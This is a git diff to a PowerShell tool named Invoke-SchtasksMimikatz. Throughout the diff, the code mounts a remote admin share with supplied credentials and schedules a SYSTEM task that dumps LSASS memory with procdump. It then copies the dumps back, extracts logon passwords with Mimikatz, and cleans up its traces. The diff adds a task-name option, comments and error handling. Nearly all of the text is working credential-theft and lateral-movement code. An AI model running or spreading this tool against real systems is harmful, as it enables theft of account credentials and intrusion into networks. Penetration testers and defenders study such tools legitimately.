@@ -62,6 +62,10 @@ Letter to use to attach a share to a remote system. By default this is set to X:
 
 Location of the procdump.ps1 script. By default the Invoke-SchtasksMimikatz tries C:\pd\procdump.ps1
 
+.PARAMETER Taskname
+
+The name of the scheduled task to be created on the remote host. By default this is set to 'pd'.
+
 .EXAMPLE
 
 C:\PS> Invoke-SchtasksMimikatz -ComputerName 10.10.0.1 -Domain Testdomain -User AdminUser -Pass PassofAdmin1234
@@ -95,96 +99,129 @@ Param(
 
  [Parameter(Position = 5, Mandatory = $false)]
  [string]
- $ProcdumpLocation = "C:\pd\procdump.ps1"
+ $ProcdumpLocation = "C:\pd\procdump.ps1",
+
+ [Parameter(Position = 6, Mandatory = $false)]
+ [string]
+ $Taskname = "pd"
+
 )
 
+
+    #Checking if a local drive letter is already in use.
 $CheckLocalShare = Test-Path "$LocalShareLetter\"
 If ($CheckLocalShare -eq $True) {
-Write-Host "$LocalShareLetter is in use already. Maybe try specifying a different local drive letter with the '-LocalShareLetter' option." 
+    Write-Host "$LocalShareLetter is in use already. Maybe try specifying a different local drive letter with the '-LocalShareLetter' option." 
 Break
 }
 Else {
-Write-Host "##### Mounting a share to \\$ComputerName\C$ at $LocalShareLetter #####"
-$netuse_command = "cmd.exe /C net use $LocalShareLetter \\$ComputerName\C$ /user:$Domain\$User $Pass"
-$netuse_command_output = Invoke-Expression -Command:$netuse_command
+    #Mount share to remote system.
+    Write-Host "##### Mounting a share to \\$ComputerName\C$ at $LocalShareLetter #####"
+    $netuse_command = "cmd.exe /C net use $LocalShareLetter \\$ComputerName\C$ /user:$Domain\$User $Pass"
+    $netuse_command_output = Invoke-Expression -Command:$netuse_command
 }
 
+
+    #Validate that share was mounted successfully
 $ShareExists = Test-Path "$LocalShareLetter\"
 If ($ShareExists -eq $True) {
-Write-Host "$LocalShareLetter mounted successfully" 
+    Write-Host "$LocalShareLetter mounted successfully" 
 }
 Else {
-Write-Host "$LocalShareLetter did not mount successfully. Maybe try specifying a different local drive letter with the '-LocalShareLetter' option."
-Break
+    Write-Host "$LocalShareLetter did not mount successfully. Maybe try specifying a different local drive letter with the '-LocalShareLetter' option."
+    Break
 }
 
+    #Create a directory called pd on the remote host
 Write-Host "##### Making a dir called 'pd' on the remote host #####"
 $mkdir = "cmd.exe /C mkdir $LocalShareLetter\pd"
 Invoke-Expression -Command:$mkdir
+
+    #Validating that directory 'pd' was created successfully
 $PdDirExists = Test-Path "$LocalShareLetter\pd\"
 If ($PdDirExists -eq $True) {
-Write-Host "$LocalShareLetter\pd was created successfully" 
+    Write-Host "$LocalShareLetter\pd was created successfully" 
 }
 Else {
-Write-Host "$LocalShareLetter\pd was not created successfully."
+    Write-Host "$LocalShareLetter\pd was not created successfully."
+    Invoke-Expression -Command:$cleanup_share
 Break
 }
 
+    #Attempting to locate the required procdump.ps1 file. If it finds it it proceeds in copying it to the remote share
 $PdPs1Exists = Test-Path $ProcdumpLocation
 If ($PdPs1Exists -eq $False) {
-Write-Host "The procdump.ps1 file was not located at $ProcdumpLocation. By default Invoke-SchtasksMimikatz attempts to find this file on the local host at C:\pd\procdump.ps1. You can modify this with the '-ProcdumpLocation' flag." 
+    Write-Host "The procdump.ps1 file was not located at $ProcdumpLocation. By default Invoke-SchtasksMimikatz attempts to find this file on the local host at C:\pd\procdump.ps1. You can modify this with the '-ProcdumpLocation' flag." 
+    Invoke-Expression -Command:$cleanup_share
 Break
 }
 Else {
-Write-Host "##### Copying over procdump.ps1 to $LocalShareLetter\pd\ #####"
-$copy_procdump = "cmd.exe /C copy $ProcdumpLocation $LocalShareLetter\pd\ #####"
-Invoke-Expression -Command:$copy_procdump
+    Write-Host "##### Copying over procdump.ps1 to $LocalShareLetter\pd\ #####"
+    $copy_procdump = "cmd.exe /C copy $ProcdumpLocation $LocalShareLetter\pd\ #####"
+    Invoke-Expression -Command:$copy_procdump
 }
 
 
-Write-Host "##### Scheduling a task called pd to create a memory dump of the LSASS process using procdump.ps1 #####"
-$create_schtask = "cmd.exe /C schtasks /Create /TN pd /S $ComputerName /U $Domain\$User /P $Pass /SC ONCE /ST 22:00:00 /TR 'powershell.exe -exec bypass -file C:\pd\procdump.ps1' /RU SYSTEM"
-Invoke-Expression -Command:$create_schtask 
-
-Write-Host "##### Running the scheduled task #####"
-$run_schtask = "cmd.exe /C schtasks /Run /S $ComputerName /TN pd /U $Domain\$User /P $Pass"
-Invoke-Expression -Command:$run_schtask
-
-Write-Host "##### Sleeping for 5 seconds #####"
-Start-Sleep -s 5
-
-$LocalDirExists = Test-Path "$LocalShareLetter\pd\"
-If ($LocalDirExists -eq $True) {
-Write-Host "##### Making a local directory at C:\pd\$ComputerName-dumps #####"
-$create_compdir = "cmd.exe /C mkdir C:\pd\$ComputerName-dumps"
-Invoke-Expression -Command:$create_compdir
-Write-Host "##### Copying LSASS dump from remote host to local directory C:\pd\$ComputerName-dumps #####"
-$copy_dumps = "cmd.exe /C copy $LocalShareLetter\pd\*.dmp C:\pd\$ComputerName-dumps\"
-Invoke-Expression -Command:$copy_dumps
+    #Scheduling a task on the remote system
+Write-Host "##### Scheduling a task called $Taskname to create a memory dump of the LSASS process using procdump.ps1 #####"
+$create_schtask = "cmd.exe /C schtasks /Create /TN $Taskname /S $ComputerName /U $Domain\$User /P $Pass /SC ONCE /ST 22:00:00 /TR 'powershell.exe -exec bypass -file C:\pd\procdump.ps1' /RU SYSTEM 2>&1"
+$schtask_output = Invoke-Expression -Command:$create_schtask
+Write-Host $schtask_output
+if ($schtask_output -match "SUCCESS"){
+    Write-Host "##### Running the scheduled task #####"
+    $run_schtask = "cmd.exe /C schtasks /Run /S $ComputerName /TN $Taskname /U $Domain\$User /P $Pass"
+    Invoke-Expression -Command:$run_schtask
 }
 else{
-Write-Host "##### Making a local directory at C:\pd\$ComputerName-dumps #####"
-$create_compdir_pd = "cmd.exe /C mkdir C:\pd"
-$create_compdir = "cmd.exe /C mkdir C:\pd\$ComputerName-dumps"
-Invoke-Expression -Command:$create_compdir_pd
-Invoke-Expression -Command:$create_compdir
+    Write-Host "Could not successfully schedule a task on the remote system. Ensure you are using credentials of an administrative user of the remote system."
+    Invoke-Expression -Command:$cleanup_remote_system
+    Invoke-Expression -Command:$cleanup_share
+break
+}
+Write-Host "##### Sleeping for 5 seconds #####"
+Start-Sleep -s 5
+
+
+    #Making a local dumps directory and copying the LSASS files over
+$LocalDirExists = Test-Path "$LocalShareLetter\pd\"
+If ($LocalDirExists -eq $True) {
+    Write-Host "##### Making a local directory at C:\pd\$ComputerName-dumps #####"
+    $create_compdir = "cmd.exe /C mkdir C:\pd\$ComputerName-dumps"
+    Invoke-Expression -Command:$create_compdir
+    Write-Host "##### Copying LSASS dump from remote host to local directory C:\pd\$ComputerName-dumps #####"
+    $copy_dumps = "cmd.exe /C copy $LocalShareLetter\pd\*.dmp C:\pd\$ComputerName-dumps\"
+    Invoke-Expression -Command:$copy_dumps
+}
+else{
+    Write-Host "##### Making a local directory at C:\pd\$ComputerName-dumps #####"
+    $create_compdir_pd = "cmd.exe /C mkdir C:\pd"
+    $create_compdir = "cmd.exe /C mkdir C:\pd\$ComputerName-dumps"
+    Invoke-Expression -Command:$create_compdir_pd
+    Invoke-Expression -Command:$create_compdir
 }
 
-
+    #Change names of LSASS dump files
 Write-Host "##### Changing name of dump file to lsass.dmp #####"
-$change_name = "cmd.exe /C move C:\pd\$ComputerName-dumps\*.dmp C:\pd\$ComputerName-dumps\lsass.dmp"
-Invoke-Expression -Command:$change_name
+cd "C:\pd\$ComputerName-dumps"
+Get-ChildItem -Path "C:\pd\$ComputerName-dumps\" | ForEach-Object -begin { $count=1 } -process { rename-item $_ -NewName "lsass$count.dmp"; $count++ }
+#$change_name = "cmd.exe /C move C:\pd\$ComputerName-dumps\*.dmp C:\pd\$ComputerName-dumps\lsass.dmp"
+#Invoke-Expression -Command:$change_name
 
-Write-Host "##### Copying lsass.dmp file to C:\pd\ for use with Mimikatz #####"
-$copy_to_pd = "cmd.exe /C copy C:\pd\$ComputerName-dumps\lsass.dmp C:\pd\"
+
+    #Copying file to C:\pd to run mimikatz
+Write-Host "##### Copying lsass.dmp files to C:\pd\ for use with Mimikatz #####"
+$copy_to_pd = "cmd.exe /C copy C:\pd\$ComputerName-dumps\lsass1.dmp C:\pd\"
 Invoke-Expression -Command:$copy_to_pd
 
+
+    #Running Invoke-Mimikatz against the dump
 Write-Host "##### Extracting credentials from lsass.dmp file with Mimikatz #####"
-Invoke-Mimikatz -Command '"sekurlsa::minidump C:\pd\lsass.DMP" sekurlsa::logonPasswords exit >> report.txt'
+Invoke-Mimikatz -Command '"sekurlsa::minidump C:\pd\lsass1.DMP" sekurlsa::logonPasswords exit >> report.txt'
 
 Write-Host "##### Sleeping for 5 seconds #####"
 Start-Sleep -s 5
 
+    #Cleaning up the local lsass1.dmp, remote pd directory, attached share, and remote scheduled task
 Write-Host "##### Starting cleanup on remote host #####"
 Write-Host "##### Removing lsass.dmp from pd directory on local host #####"
 $cleanup_local_system = "cmd.exe /C del C:\pd\lsass.dmp"
@@ -195,17 +232,17 @@ $cleanup_remote_system = "cmd.exe /C rmdir /q /s $LocalShareLetter\pd"
 Invoke-Expression -Command:$cleanup_remote_system
 $RemoteShareExists = Test-Path "$LocalShareLetter\pd"
 If ($RemoteShareExists -eq $True) {
-Write-Host "The share $ComputerName\pd still exists on the remote system! Some manual cleanup may be required." 
+    Write-Host "The share $ComputerName\pd still exists on the remote system! Some manual cleanup may be required." 
 }
 else{
-Write-Host "Remote directory removed successfully."
+    Write-Host "Remote directory removed successfully."
 }
 Write-Host "##### Removing $LocalShareLetter share from local system #####"
 $cleanup_share = "cmd.exe /C net use $LocalShareLetter /delete"
 Invoke-Expression -Command:$cleanup_share
 
-Write-Host "##### Deleting pd scheduled task on remote system #####"
-$cleanup_schtask = "cmd.exe /C schtasks /Delete /TN pd /F /S $ComputerName /U $Domain\$User /P $Pass"
+Write-Host "##### Deleting $Taskname scheduled task on remote system #####"
+$cleanup_schtask = "cmd.exe /C schtasks /Delete /TN $Taskname /F /S $ComputerName /U $Domain\$User /P $Pass"
 Invoke-Expression -Command:$cleanup_schtask
 
 }
